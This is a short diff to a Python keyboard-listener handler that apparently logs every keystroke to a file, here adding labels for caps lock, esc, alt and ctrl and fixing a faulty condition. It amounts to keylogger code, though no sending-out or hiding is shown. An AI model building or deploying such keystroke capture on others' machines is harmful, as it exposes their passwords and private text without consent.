@@ -42,10 +42,14 @@ def on_press(key):
             except ValueError:
                 # This happens if the first key pressed is backspace (on an empty file)
                 pass
-        elif key == keyboard.Key.alt or keyboard.Key.alt_gr or keyboard.Key.alt_l or keyboard.Key.alt_r:
-            file1.write(' (alt) ')
-        if key == keyboard.Key.esc:
+        elif key == keyboard.Key.caps_lock:
+            file1.write(' (CAPS Toggle) ')
+        elif key == keyboard.Key.esc:
             file1.write(' (esc) ')
+        elif key == keyboard.Key.alt:
+            file1.write(' (alt) ')
+        elif key == keyboard.Key.ctrl:
+            file1.write(' (ctrl) ')
         elif key == keyboard.Key.f9:
             # F9 is set to kill the process (Used mainly for testing/debugging purposes) (Plus no one uses it)
             file1.close()
